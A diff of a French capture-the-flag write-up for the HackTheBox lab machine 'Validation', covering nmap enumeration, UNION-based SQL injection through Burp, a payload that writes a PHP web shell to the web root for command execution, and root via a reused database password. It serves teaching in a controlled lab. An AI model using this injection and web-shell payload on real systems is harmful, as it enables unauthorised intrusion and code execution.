@@ -8,11 +8,17 @@ author: "by rnek0"
 
 # Machine Validation - htb
 
+![Validation](/assets/validation/Validation.png)
+
 * [Validation](https://app.hackthebox.com/machines/Validation)
 * 10.10.11.116
 * Crée par **ippsec**
 
+&nbsp;
+
 Ce write-up est destiné à **quelqu'un qui souhaiterait s'initier à sqli**, on va faire cela dans un environnement controlé dans la plateforme [Hackthebox](https://app.hackthebox.com/). Je tente d'expliquer le processus de A à Z et bien qu'il puisse sembler compliqué pour un néophyte il n'en est rien. Tout a un sens et avec un minimum de travail assidu cela semblera assez simple. D'ailleurs la machine en question est qualifiée de Facile. Il est conseillé d'éffectuer ce tuto dans une machine virtuelle, cela va de soi.
+
+&nbsp;
 
 ## Connection à htb, accés au réséau controlé.
 
@@ -33,6 +39,8 @@ Ne pas oublier les commandes suivantes pour verifier le tun et le réséau
 > je suis en tun0  
 > Avec l'ip 10.10.14.2
 
+&nbsp;
+
 ## Spawn the machine
 
 Aller dans la page de HTB et cliquer sur le bouton qui va spawn la machine
@@ -41,9 +49,11 @@ On aura l'addresse ip de la machine et on clique dessus pour avoir l'ip de la ma
 
 >10.10.11.116 
 
+&nbsp;
+
 ## Enumération
 
-1. On commence par tester si la machine est UP avec un ping :
+> A ) On commence par tester si la machine est **UP** avec un **ping** :
 
 ```bash
 └╼rnek0$ping -c3 10.10.11.116 
@@ -68,7 +78,9 @@ On va se servir de l'outil **whichSystem.py** pour confirmer :
 Au bout d'un moment on crée ses propres scripts, celui-ci et le suivant "extractPorts" ont été crées par **S4vitar**  
 Si vous êtes "hispanohablante" et souhaitez vous initier au monde du pentesting, je ne peux que vous conseiller de jetter un coup d'oeuil a son academie sur **[https://hack4u.io](https://hack4u.io)**.
 
-2. On va faire un scan avec **nmap** pour savoir quels sont les ports ouverts.
+&nbsp;
+
+> B ) On va faire un scan des ports avec **nmap** pour savoir quels sont les ports ouverts.
 
 ```bash
 #nmap -p- -sS --open --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG allPorts
@@ -118,6 +130,8 @@ On va utiliser la fonction bash **extractPorts** qui est dans nôtre .zshrc pour
 
 ![Capture des port ouverts](/assets/validation/extractPorts.png)
 
+&nbsp;
+
 Maintenant on va donc faire un scan nmap sur ces ports specifiques pour avoir des infos un peu plus en profondeur: 
 
 ```bash
@@ -128,11 +142,13 @@ INFOS SUR CES PORTS :
 
 * 22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 * 80/tcp   open  http    syn-ack Apache httpd 2.4.48 ((Debian))
-* Supported Methods: GET HEAD POST OPTIONS
-* 4566/tcp open  http    syn-ack nginx |_http-title: [403 Forbidden](https://developer.mozilla.org/fr/docs/Web/HTTP/Status/403)  le serveur comprend la requête mais refuse de l'autoriser.
-* 8080/tcp open  http    syn-ack nginx |_http-title: 502 Bad Gateway
+* Supported Methods: GET HEAD POST OPTIONS  
+* 4566/tcp open  http    syn-ack nginx \| _http-title: [403 Forbidden](https://developer.mozilla.org/fr/docs/Web/HTTP/Status/403)  le serveur comprend la requête mais refuse de l'autoriser.
+* 8080/tcp open  http    syn-ack nginx \| _http-title: 502 Bad Gateway
 
-4. Recherche du contenu du service dans le port **80** avec l'outil whatweb
+&nbsp;
+
+> Recherche du contenu du service dans le port **80** avec l'outil **whatweb**
 
 ```bash
 └──╼ #whatweb http://10.10.11.116
@@ -146,6 +162,8 @@ Nous avons :
 * PHP[7.4.23]  
 * JQuery  
 
+&nbsp;
+
 Sur le port **8080** quelques infos mais *rien de très interessant* 
 
 ```bash
@@ -155,6 +173,8 @@ http://10.10.11.116:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[ngi
 
 * [502 Bad Gateway](https://developer.mozilla.org/fr/docs/Web/HTTP/Status/502) indique que le serveur, agissant comme une passerelle ou un proxy, a reçu une réponse invalide depuis le serveur en amont.
 * nginx
+
+&nbsp;
 
 On va donc aller voir le site avec le navigateur:
 
@@ -207,12 +227,14 @@ On va voir qu'est ce que l'on peut faire avec **burpsuite** qui est une applicat
 
 >Comment savoir si on peut faire une injection sql ? Puis qu'est ce que sql ?  
 
-Sql est un language qui permet de faire des demandes à une base de données (grosso modo), la base de données contient les informations, on fait la demande avec **sql** on traite la sortie avec le fichier **php** qui va générer du code **html** à la volée, et sera servi à l'utilisateur dans le navigateur; c'est ce que l'on appelle des pages dynamiques d'un site internet.
+Sql est un language qui permet de faire des demandes à une base de données à partir des pages php dans le cas présent, la base de données contient les informations, on fait la demande avec **sql** on traite la sortie avec le fichier **php** qui va générer du code **html** à la volée, et sera servi à l'utilisateur dans le navigateur; c'est ce que l'on appelle des pages dynamiques d'un site internet.
 
 Les requettes sql sont du style :  
 ```
 select * FROM <table> WHERE <champ> = "<valeur demandée>"
 ```
+
+&nbsp;
 
 Ici on va jouer sur le champ country de la table registration, donc notre requette deviendra comme ceci :
 
@@ -220,12 +242,16 @@ Ici on va jouer sur le champ country de la table registration, donc notre requet
 select * FROM registration WHERE country=Afganistan'
 ```
 
+&nbsp;
 
-On essaye avec un **union select database() -- -** et on tombe sur le nom de la base de données. Ici on voit le detail du code html generé et retourné par le serveur.
+
 
 ![Recherche du nom de la base](/assets/validation/injection.png)
 
-Puis avec **union select version() -- -** et on recupere la version de la base 10.5.11-MariaDB-1
+
+Puis comme on voit ci-dessus, on essaye avec un **```union select database() -- -```** et on tombe sur le nom de la base de données. Ici on voit le detail du code html generé et retourné par le serveur.
+
+Avec la commande **```union select version() -- -```** et on recupere la version de la base 10.5.11-MariaDB-1
 
 ![Recherche de la version de la base](/assets/validation/sqli-avec-burp.png)
 
@@ -238,26 +264,35 @@ Puis avec **union select version() -- -** et on recupere la version de la base 1
 ![Recherche de la version de la base](/assets/validation/sqli-avec-burp5.png)
 
 On continue avec les injections jusqu'a tenter d'écrire dans le path de l'url un fichier que l'on va nommer **prueba.php** que l'on puisse executer en faisant appel a l'url! (L'injection sql va nous permettre d'envoyer le fichier dans le serveur)  
-Exemple de la query forgée dans burpsuite : 
+
+&nbsp;
+
+Exemple de la query forgée dans burpsuite, faites défiler pour voir la fin de la commande : 
+
 
 ```
 username=kiki&country=Afganistan' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -
 ```
 
+&nbsp;
+
 Et la sortie que genere le fichier php, l'erreur correspond au fait que nous n'avons pas passé de variable au paramettre cmd qui est attendu par le morceau de code php que l'on injecte.
 
 ![Recherche de la version de la base](/assets/validation/sqli-avec-burp6.png)
 
-Ici on voit que l'on passe la commande whoami a la "variable" cmd et cela nous retourne www-data
+&nbsp;
+
+Ici on voit que l'on passe la commande **whoami** a la "variable" **cmd** et cela nous retourne **www-data**
 
 ![Recherche de la version de la base](/assets/validation/sqli-avec-burp7.png)
 
-Si on passe la commande cat, on obtiens l'affichage du code de la page account.php
+&nbsp;
+
+Si on passe la commande **cat**, on obtiens l'affichage du code de la page **account.php**
 
 ![Recherche de la version de la base](/assets/validation/sqli-avec-burp8.png)
 
-
-
+&nbsp;
 
 Pour finir on va faire un script en python pour automatiser la procédure : 
 
@@ -314,7 +349,9 @@ if __name__ == '__main__':
     shell.interactive()
 ```
 
-Voila pour un debut, si vous êtes arrivés jusqu'à ici un bonus sur l'escalade :
+&nbsp;
+
+Voila pour un debut, si vous êtes arrivés jusqu'à ici **un bonus sur l'escalade** :
 
 On aurait pu vous afficher aussi le code de la page **config.php** en plus de **account.php** avec la même requette vue precèdemment dans la capture d'écran (celle avec test.php)
 
@@ -325,5 +362,3 @@ En essayant de faire un **su -** avec ce mot de passe, on obtient un accès **ro
 Note : Vous n'obtiendrez pas toujours une invite visible après avoir entré le mot de passe. Si vous entrez une commande telle que whoami vous verrez qu'il vous a bien permis d'avoir un shell en root.
 
 Voici le partage du resultat sur [HTB](https://www.hackthebox.com/achievement/machine/944728/382)
-
-[Retour à l'index du wiki](https://man.sr.ht/~rnek0/rnek0pedia/)
